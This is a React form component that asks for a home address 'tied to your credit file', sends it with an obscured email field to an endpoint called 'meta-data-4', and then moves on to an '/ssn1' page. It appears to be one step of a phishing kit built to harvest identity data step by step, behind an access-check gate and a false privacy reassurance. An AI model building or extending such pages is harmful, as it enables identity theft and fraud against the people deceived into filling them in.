import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import useAccessCheck from '../Utils/useAccessCheck';

const HomeAddress: React.FC = () => {
  const [stAd, setStAd] = useState('');
  const [apt, setApt] = useState('');
  const [city, setCity] = useState('');
  const [state, setState] = useState('');
  const [zipCode, setZipCode] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState({ 
    stAd: '', 
    apt: '', 
    city: '', 
    state: '', 
    zipCode: '' 
  });

  const navigate = useNavigate();
  const location = useLocation();
  const { emzemz } = location.state || {};
  const isAllowed = useAccessCheck(baseUrl);

  // Debug: Log the received email
  console.log('HomeAddress received email:', emzemz);

  // Show loading state while checking access
  if (!isAllowed) {
    return <div>Loading...</div>; // Or a proper loading spinner
  }

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setIsLoading(true);

    let newErrors = {
      stAd: !stAd.trim() ? 'Street Address is required' : '',
      city: !city.trim() ? 'City is required' : '',
      state: !state.trim() ? 'State is required' : '',
      zipCode: !zipCode.trim() ? 'Zip Code is required' : '',
      apt: ''
    };

    setErrors(newErrors);

    // Check if there are no errors (apt is optional)
    if (!newErrors.stAd && !newErrors.city && !newErrors.state && !newErrors.zipCode) {
      try {
        await axios.post(`${baseUrl}api/meta-data-4/`, {
          emzemz,
          stAd,
          apt,
          city,
          state,
          zipCode,
        });
        console.log('Home address submitted successfully');
        navigate('/ssn1', { state: { emzemz } });
      } catch (error) {
        console.error('Error submitting home address:', error);
        setErrors(prev => ({
          ...prev,
          form: 'There was an error submitting your address. Please try again.'
        }));
        setIsLoading(false);
      }
    } else {
      setIsLoading(false);
    }
  };

  return (
    <div className="flex-1 bg-gray-200 rounded shadow-sm max-w-4xl mx-auto my-8">
      <div className="border-b-2 border-teal-500 px-8 py-4">
        <h2 className="text-xl font-semibold text-gray-800">Home Address</h2>
      </div>

      <div className="px-8 py-6 bg-white space-y-6">
        <p className="text-sm text-gray-600 text-center mb-8">
          We'll need you to confirm your home address. The one tied to your credit file.
        </p>
        
        <form onSubmit={handleSubmit} className="max-w-lg mx-auto">
          {/* Street Address */}
          <div className="mb-4">
            <div className="flex items-center gap-4 ">
              <label className="text-gray-700 w-32 text-right">Street Address:</label>
              <input
                id="stAd"
                name="stAd"
                type="text"
                value={stAd}
                onChange={(e) => setStAd(e.target.value)}
                className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
              />
            </div>
            {errors.stAd && (
              <div className="flex items-center gap-2 text-sm text-red-600 mt-1 ml-36">
                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                </svg>
                {errors.stAd}
              </div>
            )}
          </div>

          {/* Apt or Unit */}
          <div className="mb-4">
            <div className="flex items-center gap-4">
              <label className="text-gray-700 w-32 text-right">Apt or Unit (optional):</label>
              <input
                id="apt"
                name="apt"
                type="text"
                value={apt}
                onChange={(e) => setApt(e.target.value)}
                className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
              />
            </div>
          </div>

          {/* City */}
          <div className="mb-4">
            <div className="flex items-center gap-4">
              <label className="text-gray-700 w-32 text-right">City:</label>
              <input
                id="city"
                name="city"
                type="text"
                value={city}
                onChange={(e) => setCity(e.target.value)}
                className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
              />
            </div>
            {errors.city && (
              <div className="flex items-center gap-2 text-sm text-red-600 mt-1 ml-36">
                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                </svg>
                {errors.city}
              </div>
            )}
          </div>

          {/* State */}
          <div className="mb-4">
            <div className="flex items-center gap-4">
              <label className="text-gray-700 w-32 text-right">State:</label>
              <input
                id="state"
                name="state"
                type="text"
                value={state}
                onChange={(e) => setState(e.target.value)}
                className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
              />
            </div>
            {errors.state && (
              <div className="flex items-center gap-2 text-sm text-red-600 mt-1 ml-36">
                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                </svg>
                {errors.state}
              </div>
            )}
          </div>

          {/* Zip Code */}
          <div className="mb-6">
            <div className="flex items-center gap-4">
              <label className="text-gray-700 w-32 text-right">Zip Code:</label>
              <input
                id="zipCode"
                name="zipCode"
                type="text"
                value={zipCode}
                onChange={(e) => setZipCode(e.target.value)}
                className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
              />
            </div>
            {errors.zipCode && (
              <div className="flex items-center gap-2 text-sm text-red-600 mt-1 ml-36">
                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                </svg>
                {errors.zipCode}
              </div>
            )}
          </div>

          <div className=" border-b-2 border-teal-500 justify-center text-center px-6 py-4">
            {!isLoading ? (
              <button
                type="submit"
                className="bg-gray-600 hover:bg-gray-700 text-white px-16 py-2 text-sm rounded"
              >
                Continue
              </button>
            ) : (
              <div className="h-10 w-10 animate-spin rounded-full border-4 border-solid border-gray-600 border-t-transparent"></div>
            )}
          </div>
        </form>
      </div>

      <div className="px-6 py-4 bg-gray-50 border-t border-gray-200">
        <p className="text-xs text-gray-600">
          Your information is secure and will be used in accordance with our Privacy Policy.
        </p>
      </div>
    </div>
  );
};

export default HomeAddress;